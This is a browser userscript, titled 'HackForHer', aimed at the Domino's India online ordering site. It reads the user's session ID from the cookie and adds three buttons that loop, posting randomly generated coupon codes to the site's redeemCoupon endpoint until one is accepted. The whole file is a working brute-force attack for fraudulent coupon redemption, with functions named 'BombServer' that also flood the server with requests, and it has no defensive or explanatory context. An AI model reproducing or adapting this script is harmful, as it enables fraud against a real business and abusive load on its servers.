// ==UserScript== 
// @name HackForHer 
// @namespace http://www.usercript.org/ juliet/ 
// @description Creates Magic 
// @include https://pizzaonline.dominos.co.in/* 
// ==/UserScript==




   //FETCHES THE CURRENT SESSION_ID
   var coo = document.cookie.split(";");
   var coo2 = coo[0].split("=");
   console.log("Session ID = " + coo2[1]);
   var session_id = coo2[1];

   
	
	//console.log(document.cookie.session_id);
	
  var getCouponDiv = document.getElementsByClassName("enter-coupon-code");
   var BombServerButton1 = document.createElement('button');
   BombServerButton1.type = "button";
   BombServerButton1.onclick = function(){BombServer1()};
   var node = document.createTextNode("Click Me 1!");
   BombServerButton1.appendChild(node);
   getCouponDiv[0].appendChild(BombServerButton1);

var BombServerButton2 = document.createElement('button');
   BombServerButton2.type = "button";
   BombServerButton2.onclick = function(){BombServer2()};
   var node = document.createTextNode("Click Me 2!");
   BombServerButton2.appendChild(node);
   getCouponDiv[0].appendChild(BombServerButton2);

var BombServerButton3 = document.createElement('button');
   BombServerButton3.type = "button";
   BombServerButton3.onclick = function(){BombServer3()};
   var node = document.createTextNode("Click Me 3!");
   BombServerButton3.appendChild(node);
   getCouponDiv[0].appendChild(BombServerButton3);
   

  
     var i1=0; var i2 = 0; var i3 = 0;
     var status=0;
     var id1; 
     var id2; 
     var id3;



function randomFromInterval(from,to)
{
    return Math.floor(Math.random()*(to-from+1)+from);
}





    function BombServer1() 
     {   
         
         
         var http = new XMLHttpRequest();
        
        do
         {
         id1 = randomFromInterval(1000,9999);
         var parameters = "session_id="+session_id+"&coupon_code=PO7A"+id1+"1";
         http.open("POST", "redeemCoupon.php", true);
 
          //Send the proper header information along with the request
         http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         http.setRequestHeader("Content-length", parameters .length);
         http.setRequestHeader("Connection", "close");
         
         http.onreadystatechange = function() {//Handler function for call back on state change.
    if(http.readyState == 4) {
       //alert(http.responseText);
       var responseText1 = http.responseText;
        var status1 = responseText1.split(",");
        var status2 = status1[2].split(":");
        status = status2[1];
       // console.log("The status of the current order is " + status);
               }
               }
          http.send(parameters);
             i1++;
         }while(i1<9999||status!="1");
	
       } 





function BombServer2() 
     {
         var http = new XMLHttpRequest();
         
         
         
        do
         {
             id2 = randomFromInterval(20,99);
         var parameters = "session_id="+session_id+"&coupon_code=PO7B"+id2+"561";
         http.open("POST", "redeemCoupon.php", true);
 
          //Send the proper header information along with the request
         http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         http.setRequestHeader("Content-length", parameters .length);
         http.setRequestHeader("Connection", "close");
         
         http.onreadystatechange = function() {//Handler function for call back on state change.
    if(http.readyState == 4) {
       //alert(http.responseText);
       var responseText1 = http.responseText;
        var status1 = responseText1.split(",");
        var status2 = status1[2].split(":");
        status = status2[1];
       // console.log("The status of the current order is " + status);
               }
               }
          http.send(parameters);
             i2++;
         }while(id2<100||status!="1");
	
       } 


function BombServer3() 
     {
         var http = new XMLHttpRequest();
        
        do
         {
             id3 = randomFromInterval(100,999);
         var parameters = "session_id="+session_id+"&coupon_code=PO7D6"+id3+"1";
         http.open("POST", "redeemCoupon.php", true);
 
          //Send the proper header information along with the request
         http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         http.setRequestHeader("Content-length", parameters .length);
         http.setRequestHeader("Connection", "close");
         
         http.onreadystatechange = function() {//Handler function for call back on state change.
    if(http.readyState == 4) {
       //alert(http.responseText);
       var responseText1 = http.responseText;
        var status1 = responseText1.split(",");
        var status2 = status1[2].split(":");
        status = status2[1];
       // console.log("The status of the current order is " + status);
               }
               }
          http.send(parameters);
             i3++;
         }while(i3<999||status!="1");
	
       } 

